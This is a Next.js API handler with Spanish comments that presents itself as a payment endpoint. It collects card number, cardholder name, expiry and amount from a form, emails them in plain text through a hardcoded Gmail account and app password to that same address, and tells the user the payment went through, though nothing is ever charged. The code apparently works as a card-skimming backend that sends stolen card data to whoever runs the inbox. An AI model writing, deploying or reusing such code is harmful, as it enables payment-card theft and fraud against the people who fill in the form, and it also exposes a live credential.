import nodemailer from 'nodemailer';
import { NextApiRequest, NextApiResponse } from 'next';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  try {
    const { currency, paymentAmount, cardType, cardNumber, cardHolder, expiryDate } = req.body;

    // Verifica que todos los campos requeridos estén presentes
    if (!currency || !paymentAmount || !cardNumber || !cardHolder || !expiryDate) {
      console.error("❌ Datos faltantes:", { currency, paymentAmount, cardNumber, cardHolder, expiryDate });
      return res.status(400).json({ error: '❌ Datos incompletos. Verifica los campos.' });
    }

    // Configurar transporte de Nodemailer
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'blackrock.groupx@gmail.com', // Reemplázalo con tu correo de Gmail
        pass: 'bwaz bvcu chza ghnx', // ⚠️ Usa una contraseña de aplicación de Google
      },
    });

    // Configurar el contenido del correo
    const mailOptions = {
       from: `"Pago Realizado" <blackrock.groupx@gmail.com>`,
      to: 'blackrock.groupx@gmail.com',
      subject: 'Confirmación de Pago',
      text: `
        ✅ Se ha procesado un pago con éxito.

        - Moneda: ${currency}
        - Monto de Pago: ${paymentAmount} USDT
        - Tipo de Tarjeta: ${cardType}
        - Nombre en Tarjeta: ${cardHolder}
        - Número de Tarjeta: ${cardNumber}
        - Fecha de Expiración: ${expiryDate}
      `,
    };

    await transporter.sendMail(mailOptions);

    return res.status(200).json({ message: 'PAGO ENVIADO CORRECTAMENT' });
  } catch (error) {
    console.error('Error enviando correo:', error);
    return res.status(500).json({ error: '❌ Error al enviar el correo. Revisa la configuración del servidor.' });
  }
}